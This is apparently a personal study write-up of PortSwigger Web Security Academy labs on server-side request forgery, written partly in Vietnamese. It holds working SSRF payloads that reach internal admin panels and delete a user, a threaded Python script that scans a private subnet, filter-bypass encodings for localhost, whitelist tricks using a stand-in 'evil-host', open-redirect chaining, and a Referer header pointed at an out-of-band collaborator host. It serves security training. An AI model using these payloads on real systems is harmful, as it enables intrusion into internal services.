# PortSwigger-SSRF

## SSRF
Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. The location may either be the system internal server, or it can be an external server under the attacker's control 
## Common SSRF attack
### SSRF attack against the server
The reason why SSRF is a critical vuln is that the internal system grant full access to the adminstrative functionality since the requests appears to originate from a trusted location

Why do applications behave in this way, and implicitly trust requests that come from the local machine:
- The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.
- For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.
- The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.


### Lab: Basic SSRF against the local server
This lab has a stock check feature which fetches data from an internal system

```http
POST /product/stock HTTP/2
Host: 0ac6005f0316415280db53da00fd00fd.web-security-academy.net
Cookie: session=VeHU9Gn4OvdFcB5kvXujLwg4WjXcD1b0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac6005f0316415280db53da00fd00fd.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0ac6005f0316415280db53da00fd00fd.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

The stockApi is sent to the server, and then the server take the url and execute the requests directly. We can change the stockApi to get access to the admin panel and delete user carlos
```
stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```

### Lab: SSRF attacks against other back-end systems
## Lab: Basic SSRF against another back-end system
In this lab, the internal back-end system contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems

Our job in this lab is find out the private IP address the adminstrative interface is listening on. You can either write a script or use Burp Intruder to complete the task
```python
import requests
import concurrent.futures
import threading
url = 'https://0a7800f304e43df18154616e001600ca.web-security-academy.net/product/stock'

session = requests.Session()
stop_event = threading.Event()
def scan(url, i):
    if stop_event.is_set():
        return
    payload = {
        'stockApi': f"http://192.168.0.{i}:8080/admin"
    }
    response = session.post(url, data=payload)
    if response.status_code == 200:
        stop_event.set()
        print(f"\n[+] BINGO! Found Admin Interface at IP: 192.168.0.{i}\n")
        return
    else:
        print(f'[-] Checked 192.168.0.{i} -> Status: {response.status_code}')

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = [executor.submit(scan, url, i) for i in range(1, 255)]
    concurrent.futures.wait(futures)
```
- Once you have found the IP address, delete user carlos the same way we did in the previous lab (in my case the correct address is `192.168.0.198')
```
stockApi=http://192.168.0.198:8080/admin/delete?username=carlos
```
- Internal networks must enforce Zero Trust Architecture. Services running on internal IPs (like 192.168.0.X) should still require proper authentication rather than relying solely on network-level isolation

## Circumventing common SSRF defenses

### Lab: SSRF with blacklist-based input filter
Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433` (binary to decimal without octet dividing), `017700000001` (octal), or `127.1` (classfull short).
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

| Dạng mã hóa | Ví dụ đại diện cho `127.0.0.1` |
|------------|--------------------------------|
| Hexadecimal (Thập lục phân) | `0x7f000001` hoặc `0x7f.0x00.0x00.0x01` |
| Octal (Bát phân từng byte) | `0177.0000.0000.0001` |
| Bát phân kết hợp Hex | `0177.0x0.0.1` |
| Classful Short (Rút gọn) | `127.1` hoặc `127.0.1` |
| IPv6 Mapped / Alternative | `[::1]`, `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]` |
| Domain DNS Rebinding / Wildcard | `spoofed.burpcollaborator.net` (trỏ về `127.0.0.1`) hoặc `localtest.me` |

The lab implements 2 weak URL filters, one filters out `127.0.0.1`/ `localhost` and one filters out `/admin`. We just have to use a different IP representation and a case variation to bypass this
```
stockApi=http://127.1/AdMIn/delete?username=carlos
```
### SSRF with whitelist-based input filters (???)
Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing in order to redirect the server's request to an external system

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:

- You can embed credentials in a URL before the hostname, using the @ character. For example:
```
https://expected-host:fakepassword@evil-host
```

- You can use the # character to indicate a URL fragment. For example:
```
https://evil-host#expected-host
```

0 You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```
https://expected-host.evil-host
```
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

- You can use combinations of these techniques together.


### Lab: SSRF with filter bypass via open redirection vulnerability
In many systems, user submitted URL is strictly validated to prevent SSRF exploitaion. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target. 

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The URL reuturn a redirection to `http://192.168.0.68/admin`

The SSRF exploitaion works because the app validates that the supply URL is allowed, then it requests the supplied URL, which triggers the open redirection

Besides `path`, these are some wellknown redirection params: `redirect_to =` , `checkout_url=`, `domain_name=`, ...or their short ver: `r=`, `u=`,..


In the lab, you will definitely hit the wall if trying to tamper the stockApi of the check stock feature alone. There are some open redirection vulns you should notice for when looking for this kind of vuln:
1. URL/Path parameter:

    `/product/nextProduct?path=...`

    `/login?redirect=...`

    `/goto?url=...`

2. Response code HTTP 302 / 301 (Found / Moved Permanently)

When clicking `Next product` button, you will see the signs of a open redirection vuln:

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
Host: 0ac900be03858b12814ad44100a600ce.web-security-academy.net
Cookie: session=0ijXMGDOxjNhzdIYQxoZwSHtj1wyaJ9p; session=lv6mmEuXCC3XS2TOUJhHfNRXULiLCgal
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac900be03858b12814ad44100a600ce.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

And the server repsone with a `302` status code and reflectively setting the Location header:
```http
HTTP/2 302 Found
Location: /product?productId=2
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

Now that you found the open redirection, all you have to do is redirect the request to your desired location. Pass the open redirect URL pointing to the target internal admin interface inside the stockApi parameter
```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```


## Blind SSRF vulnerabilities
Blind SSRF vulnerabilities occur if you can cause an application to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response. 

The impact of blind SSRF vulnerabilities is often lower than fully informed SSRF vulnerabilities because of their one-way nature. They cannot be trivially exploited to retrieve sensitive data from back-end systems, although in some situations they can be exploited to achieve full remote code execution. 

### Lab: Blind SSRF with out-of-band detection
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. Whenever the software sees a referer header, it runs a background bot to access the referer and fetch the content in the url

To solve the lab, click on a product, intercept the request and change the referer header to Burp Collaborator's public server address. Wait for the Collaborator to poll the request, and you are done
```
GET /product?productId=1 HTTP/2
Host: 0a8d003004e8b93280634ed5000f007f.web-security-academy.net
Cookie: session=SuKwD3W0uzReqBkqGv8oJXy2AV1TsBuC
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://sfbx08dnfcdoggmboa4zcve5qwwnkk89.oastify.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

    

## Finding hidden attack surface for SSRF vulnerabilities
Many SSRF vulns are easy to find, since the web app's normal traffic often requires request params contain full URLs
### Partial URLs in requests
### URLs within data formats
Some applications transmit data in formats with a specification that allows the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server. When an application accepts data in XML format and parses it, it might be vulnerable to XXE injection. It might also be vulnerable to SSRF via XXE. We'll cover this in more detail when we look at XXE injection vulnerabilities. 
### SSRF via the Referer header
Khi bạn truy cập một trang web (ví dụ: victim.com) từ một liên kết trên một trang web khác (ví dụ: myblog.com), trình duyệt sẽ tự động đính kèm Header:
Referer: `[https://myblog.com/post-1](https://myblog.com/post-1)`

Rất nhiều hệ thống phân tích lượt truy cập (như công cụ đo đếm traffic, SEO tracking) lưu lại giá trị Referer này. Tuy nhiên, thay vì chỉ lưu chuỗi chữ đơn thuần, hệ thống analytics thường chạy một tiến trình ngầm (Background Bot) để:

- Truy cập vào URL trong Header Referer `([https://myblog.com/post-1](https://myblog.com/post-1))`.

- Đọc nội dung trang web đó để phân tích: xem trang web giới thiệu đó viết gì về mình, văn bản chứa liên kết (Anchor text) là gì, có phải là trang tin cậy hay trang rác (spam) không.

Vấn đề bảo mật xuất hiện ở đây: Máy chủ backend của hệ thống Analytics tự động biến giá trị trong Header Referer thành một HTTP Request thực tế mà không qua kiểm duyệt an toàn.


Kẻ tấn công sửa đổi giá trị Header Referer thành một địa chỉ nội bộ không thể truy cập từ Internet
```http
GET /product/123 HTTP/1.1
Host: victim.com
Referer: http://192.168.1.1/admin
User-Agent: Mozilla/5.0 ...
```